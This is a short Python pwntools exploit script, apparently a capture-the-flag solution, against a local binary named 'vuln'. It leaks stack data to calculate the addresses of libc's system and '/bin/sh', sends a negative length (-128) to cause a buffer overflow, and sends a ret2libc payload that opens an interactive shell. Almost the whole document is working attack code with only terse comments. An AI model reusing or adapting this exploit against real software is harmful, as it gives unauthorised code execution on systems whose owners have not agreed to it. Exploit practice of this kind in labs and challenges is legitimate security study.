#Import pwntools
from pwn import *

#Establish the target process
target = process('./vuln')
gdb.attach(target)

#Prompt for input for a pasue
raw_input()

#Send the payload for the leak
leak_payload = "0"*16
print target.recvuntil("Enter username: ")
target.send(leak_payload)

#Scan in the infoleaks, filter them out, and calculate the needed address
leak = target.recvuntil("Enter length: ")
leak = leak.replace("Enter length: ", "")
setvbuf_adr = u32(leak[28:32]) - 11
buffer_adr = u32(leak[20:24]) - 0x64
system_adr = setvbuf_adr - 0x25980
binsh_adr = setvbuf_adr + 0xff02f
log.info("Address of setbuffer: " + hex(setvbuf_adr))
log.info("Address of system: " + hex(system_adr))
log.info("Address of binsh: " + hex(binsh_adr))
log.info("Address of buffer: " + hex(buffer_adr))

#Send -128 to allow a buffer overflow
target.sendline("-128")

#Form the payload to pop a shell, and send it
print target.recvuntil("Enter string (length 4294967168): ")
payload = p32(system_adr) + "pwnn" + p32(binsh_adr) + "0"*(0x50 - 12) + p32(buffer_adr + 4)
target.sendline(payload)

#Enjoy your shell
target.interactive()
